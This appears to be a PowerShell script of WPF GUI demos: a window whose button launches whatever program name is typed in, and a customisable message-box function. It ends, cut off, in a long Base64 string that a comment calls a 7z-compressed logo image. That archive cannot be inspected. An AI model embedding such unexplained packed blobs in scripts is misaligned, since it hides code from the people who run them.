
function func_wpf_xaml2
{
<# Author      : Jim Moyle @jimmoyle   GitHub      : https://github.com/JimMoyle/GUIDemo #>

<# syntax which Visual Studio 2015 creates #>
$inputXML = @'
<Window x:Name="MyWindow" x:Class="GUIDemo.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUIDemo"
        mc:Ignorable="d"
        Title="MainWindow" Height="350" Width="525">
    <Grid Background="#FF1187A8" RenderTransformOrigin="0.216,0.276">
        <Button x:Name="MyButton" Content="Run Program" HorizontalAlignment="Left" Margin="295,224,0,0" VerticalAlignment="Top" Width="75" RenderTransformOrigin="3.948,-3.193"/>
        <Image x:Name="Myimage" HorizontalAlignment="Left" Height="100" Margin="104,72,0,0" VerticalAlignment="Top" Width="100"/>
        <TextBox x:Name="MyTextBox" HorizontalAlignment="Left" Height="23" Margin="86,222,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="157"/>
        <TextBlock HorizontalAlignment="Left" Margin="295,72,0,0" TextWrapping="Wrap" Text="@jimmoyle" VerticalAlignment="Top" FontSize="24"/>
    </Grid>
</Window>
'@


#========================================================
#code from previous script
#========================================================

#Add in the frameworks so that we can create the WPF GUI
Add-Type -AssemblyName presentationframework, presentationcore
#Create empty hashtable into which we will place the GUI objects
$wpf = @{ }
#Grab the content of the Visual Studio xaml file as a string
#$inputXML = Get-Content -Path ".\WPFGUIinTenLines\MainWindow.xaml"
#clean up xml there is syntax which Visual Studio 2015 creates which PoSH can't understand
$inputXMLClean = $inputXML -replace 'mc:Ignorable="d"','' -replace "x:N",'N' -replace 'x:Class=".*?"','' -replace 'd:DesignHeight="\d*?"','' -replace 'd:DesignWidth="\d*?"',''
#change string variable into xml
[xml]$xaml = $inputXMLClean
$reader = New-Object System.Xml.XmlNodeReader $xaml
#read xml data into xaml node reader object
$tempform = [Windows.Markup.XamlReader]::Load($reader)
#select each named node using an Xpath expression.
$namedNodes = $xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]")
#add all the named nodes as members to the $wpf variable, this also adds in the correct type for the objects.
$namedNodes | ForEach-Object {$wpf.Add($_.Name, $tempform.FindName($_.Name))}

#========================================================
#Your Code goes here
#========================================================


#This code runs when the button is clicked
$wpf.MyButton.add_Click({

$programname = $wpf.MytextBox.text

Start-Process $programname

	})

#=======================================================
#End of Your Code
#=======================================================


$wpf.MyWindow.ShowDialog() | Out-Null
}


function func_wpf_msgbox2
{

    Function New-WPFMessageBox {

    # For examples for use, see my blog:
    # https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/
    
    # Define Parameters
    [CmdletBinding()]
    Param
    (
        # The popup Content
        [Parameter(Mandatory=$True,Position=0)]
        [Object]$Content,

        # The window title
        [Parameter(Mandatory=$false,Position=1)]
        [string]$Title,

        # The buttons to add
        [Parameter(Mandatory=$false,Position=2)]
        [ValidateSet('OK','OK-Cancel','Abort-Retry-Ignore','Yes-No-Cancel','Yes-No','Retry-Cancel','Cancel-TryAgain-Continue','None')]
        [array]$ButtonType = 'OK',

        # The buttons to add
        [Parameter(Mandatory=$false,Position=3)]
        [array]$CustomButtons,

        # Content font size
        [Parameter(Mandatory=$false,Position=4)]
        [int]$ContentFontSize = 14,

        # Title font size
        [Parameter(Mandatory=$false,Position=5)]
        [int]$TitleFontSize = 14,

        # BorderThickness
        [Parameter(Mandatory=$false,Position=6)]
        [int]$BorderThickness = 0,

        # CornerRadius
        [Parameter(Mandatory=$false,Position=7)]
        [int]$CornerRadius = 8,

        # ShadowDepth
        [Parameter(Mandatory=$false,Position=8)]
        [int]$ShadowDepth = 3,

        # BlurRadius
        [Parameter(Mandatory=$false,Position=9)]
        [int]$BlurRadius = 20,

        # WindowHost
        [Parameter(Mandatory=$false,Position=10)]
        [object]$WindowHost,

        # Timeout in seconds,
        [Parameter(Mandatory=$false,Position=11)]
        [int]$Timeout,

        # Code for Window Loaded event,
        [Parameter(Mandatory=$false,Position=12)]
        [scriptblock]$OnLoaded,

        # Code for Window Closed event,
        [Parameter(Mandatory=$false,Position=13)]
        [scriptblock]$OnClosed

    )

    # Dynamically Populated parameters
    DynamicParam {
        
        # ContentBackground
        $ContentBackground = 'ContentBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentBackground, $RuntimeParameter)
        

        # FontFamily
        $FontFamily = 'FontFamily'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute)  
        $arrSet = [System.Drawing.FontFamily]::Families | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)
        $AttributeCollection.Add($ValidateSetAttribute)
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($FontFamily, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($FontFamily, $RuntimeParameter)
        $PSBoundParameters.FontFamily = "Segui"

        # TitleFontWeight
        $TitleFontWeight = 'TitleFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleFontWeight, $RuntimeParameter)

        # ContentFontWeight
        $ContentFontWeight = 'ContentFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentFontWeight, $RuntimeParameter)
        

        # ContentTextForeground
        $ContentTextForeground = 'ContentTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentTextForeground, $RuntimeParameter)

        # TitleTextForeground
        $TitleTextForeground = 'TitleTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleTextForeground, $RuntimeParameter)

        # BorderBrush
        $BorderBrush = 'BorderBrush'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.BorderBrush = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($BorderBrush, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($BorderBrush, $RuntimeParameter)


        # TitleBackground
        $TitleBackground = 'TitleBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleBackground, $RuntimeParameter)

        # ButtonTextForeground
        $ButtonTextForeground = 'ButtonTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ButtonTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ButtonTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ButtonTextForeground, $RuntimeParameter)

        # Sound
        #$Sound = 'Sound'
        #$AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        #$ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        #$ParameterAttribute.Mandatory = $False
        #$ParameterAttribute.Position = 14
        #$AttributeCollection.Add($ParameterAttribute) 
        #$arrSet = (Get-ChildItem "$env:SystemDrive\Windows\Media" -Filter Windows* | Select -ExpandProperty Name).Replace('.wav','')
        #$ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        #$AttributeCollection.Add($ValidateSetAttribute)
        #$RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($Sound, [string], $AttributeCollection)
        #$RuntimeParameterDictionary.Add($Sound, $RuntimeParameter)

        return $RuntimeParameterDictionary
    }

    Begin {
        Add-Type -AssemblyName PresentationFramework
    }
    
    Process {

# Define the XAML markup
[XML]$Xaml = @"
<Window 
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        x:Name="Window" Title="" SizeToContent="WidthAndHeight" WindowStartupLocation="CenterScreen" WindowStyle="None" ResizeMode="NoResize" AllowsTransparency="True" Background="Transparent" Opacity="1">
    <Window.Resources>
        <Style TargetType="{x:Type Button}">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border>
                            <Grid Background="{TemplateBinding Background}">
                                <ContentPresenter />
                            </Grid>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>
    <Border x:Name="MainBorder" Margin="10" CornerRadius="$CornerRadius" BorderThickness="$BorderThickness" BorderBrush="$($PSBoundParameters.BorderBrush)" Padding="0" >
        <Border.Effect>
            <DropShadowEffect x:Name="DSE" Color="Black" Direction="270" BlurRadius="$BlurRadius" ShadowDepth="$ShadowDepth" Opacity="0.6" />
        </Border.Effect>
        <Border.Triggers>
            <EventTrigger RoutedEvent="Window.Loaded">
                <BeginStoryboard>
                    <Storyboard>
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="ShadowDepth" From="0" To="$ShadowDepth" Duration="0:0:1" AutoReverse="False" />
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="BlurRadius" From="0" To="$BlurRadius" Duration="0:0:1" AutoReverse="False" />
                    </Storyboard>
                </BeginStoryboard>
            </EventTrigger>
        </Border.Triggers>
        <Grid >
            <Border Name="Mask" CornerRadius="$CornerRadius" Background="$($PSBoundParameters.ContentBackground)" />
            <Grid x:Name="Grid" Background="$($PSBoundParameters.ContentBackground)">
                <Grid.OpacityMask>
                    <VisualBrush Visual="{Binding ElementName=Mask}"/>
                </Grid.OpacityMask>
                <StackPanel Name="StackPanel" >                   
                    <TextBox Name="TitleBar" IsReadOnly="True" IsHitTestVisible="False" Text="$Title" Padding="10" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$TitleFontSize" Foreground="$($PSBoundParameters.TitleTextForeground)" FontWeight="$($PSBoundParameters.TitleFontWeight)" Background="$($PSBoundParameters.TitleBackground)" HorizontalAlignment="Stretch" VerticalAlignment="Center" Width="Auto" HorizontalContentAlignment="Center" BorderThickness="0"/>
                    <DockPanel Name="ContentHost" Margin="0,10,0,10"  >
                    </DockPanel>
                    <DockPanel Name="ButtonHost" LastChildFill="False" HorizontalAlignment="Center" >
                    </DockPanel>
                </StackPanel>
            </Grid>
        </Grid>
    </Border>
</Window>
"@

[XML]$ButtonXaml = @"
<Button xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Width="Auto" Height="30" FontFamily="Segui" FontSize="16" Background="Transparent" Foreground="White" BorderThickness="1" Margin="10" Padding="20,0,20,0" HorizontalAlignment="Right" Cursor="Hand"/>
"@

[XML]$ButtonTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="16" Background="Transparent" Foreground="$($PSBoundParameters.ButtonTextForeground)" Padding="20,5,20,5" HorizontalAlignment="Center" VerticalAlignment="Center"/>
"@

[XML]$ContentTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Text="$Content" Foreground="$($PSBoundParameters.ContentTextForeground)" DockPanel.Dock="Right" HorizontalAlignment="Center" VerticalAlignment="Center" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$ContentFontSize" FontWeight="$($PSBoundParameters.ContentFontWeight)" TextWrapping="Wrap" Height="Auto" MaxWidth="500" MinWidth="50" Padding="10"/>
"@

    # Load the window from XAML
    $Window = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $xaml))

    # Custom function to add a button
    Function Add-Button {
        Param($Content)
        $Button = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonXaml))
        $ButtonText = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonTextXaml))
        $ButtonText.Text = "$Content"
        $Button.Content = $ButtonText
        $Button.Add_MouseEnter({
            $This.Content.FontSize = "17"
        })
        $Button.Add_MouseLeave({
            $This.Content.FontSize = "16"
        })
        $Button.Add_Click({
            $Window.Close()
            Write-host $This.Content.Text
        })
        $Window.FindName('ButtonHost').AddChild($Button)
    }

    # Add buttons
    If ($ButtonType -eq "OK")
    {
        Add-Button -Content "OK"
    }

    If ($ButtonType -eq "OK-Cancel")
    {
        Add-Button -Content "OK"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Abort-Retry-Ignore")
    {
        Add-Button -Content "Abort"
        Add-Button -Content "Retry"
        Add-Button -Content "Ignore"
    }

    If ($ButtonType -eq "Yes-No-Cancel")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Yes-No")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
    }

    If ($ButtonType -eq "Retry-Cancel")
    {
        Add-Button -Content "Retry"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Cancel-TryAgain-Continue")
    {
        Add-Button -Content "Cancel"
        Add-Button -Content "TryAgain"
        Add-Button -Content "Continue"
    }

    If ($ButtonType -eq "None" -and $CustomButtons)
    {
        Foreach ($CustomButton in $CustomButtons)
        {
            Add-Button -Content "$CustomButton"
        }
    }

    # Remove the title bar if no title is provided
    If ($Title -eq "")
    {
        $TitleBar = $Window.FindName('TitleBar')
        $Window.FindName('StackPanel').Children.Remove($TitleBar)
    }

    # Add the Content
    If ($Content -is [String])
    {
        # Replace double quotes with single to avoid quote issues in strings
        If ($Content -match '"')
        {
            $Content = $Content.Replace('"',"'")
        }
        
        # Use a text box for a string value...
        $ContentTextBox = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ContentTextXaml))
        $Window.FindName('ContentHost').AddChild($ContentTextBox)
    }
    Else
    {
        # ...or add a WPF element as a child
        Try
        {
            $Window.FindName('ContentHost').AddChild($Content) 
        }
        Catch
        {
            $_
        }        
    }

    # Enable window to move when dragged
    $Window.FindName('Grid').Add_MouseLeftButtonDown({
        $Window.DragMove()
    })

    # Activate the window on loading
    If ($OnLoaded)
    {
        $Window.Add_Loaded({
            $This.Activate()
            Invoke-Command $OnLoaded
        })
    }
    Else
    {
        $Window.Add_Loaded({
            $This.Activate()
        })
    }
    

    # Stop the dispatcher timer if exists
    If ($OnClosed)
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
            Invoke-Command $OnClosed
        })
    }
    Else
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
        })
    }
    

    # If a window host is provided assign it as the owner
    If ($WindowHost)
    {
        $Window.Owner = $WindowHost
        $Window.WindowStartupLocation = "CenterOwner"
    }

    # If a timeout value is provided, use a dispatcher timer to close the window when timeout is reached
    If ($Timeout)
    {
        $Stopwatch = New-object System.Diagnostics.Stopwatch
        $TimerCode = {
            If ($Stopwatch.Elapsed.TotalSeconds -ge $Timeout)
            {
                $Stopwatch.Stop()
                $Window.Close()
            }
        }
        $DispatcherTimer = New-Object -TypeName System.Windows.Threading.DispatcherTimer
        $DispatcherTimer.Interval = [TimeSpan]::FromSeconds(1)
        $DispatcherTimer.Add_Tick($TimerCode)
        $Stopwatch.Start()
        $DispatcherTimer.Start()
    }

    # Play a sound
    If ($($PSBoundParameters.Sound))
    {
        $SoundFile = "$env:SystemDrive\Windows\Media\$($PSBoundParameters.Sound).wav"
        $SoundPlayer = New-Object System.Media.SoundPlayer -ArgumentList $SoundFile
        $SoundPlayer.Add_LoadCompleted({
            $This.Play()
            $This.Dispose()
        })
        $SoundPlayer.LoadAsync()
    }

    # Display the window
    $null = $window.Dispatcher.InvokeAsync{$window.ShowDialog()}.Wait()

    }
}

# Load required assemblies
Add-Type -AssemblyName PresentationFramework, PresentationCore , System.Windows.Forms

#https://smsagent.blog/2018/02/01/create-a-custom-toast-notification-with-wpf-and-powershell/
# Code to create a base64 string from an image file, so that you can include it in the script as a string
#$File = "C:\somepicturefile.png"
#$Image = [System.Drawing.Image]::FromFile($File)
#$MemoryStream = New-Object System.IO.MemoryStream
#$Image.Save($MemoryStream, $Image.RawFormat)
#[System.Byte[]]$Bytes = $MemoryStream.ToArray()
#$Base64 = [System.Convert]::ToBase64String($Bytes)
#$Image.Dispose()
#$MemoryStream.Dispose()
#$Base64 > c:\base64.txt

# Create the custom logo from Base64 string; this is a image file regulary compressed with 7z on commandline
$Base64='
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
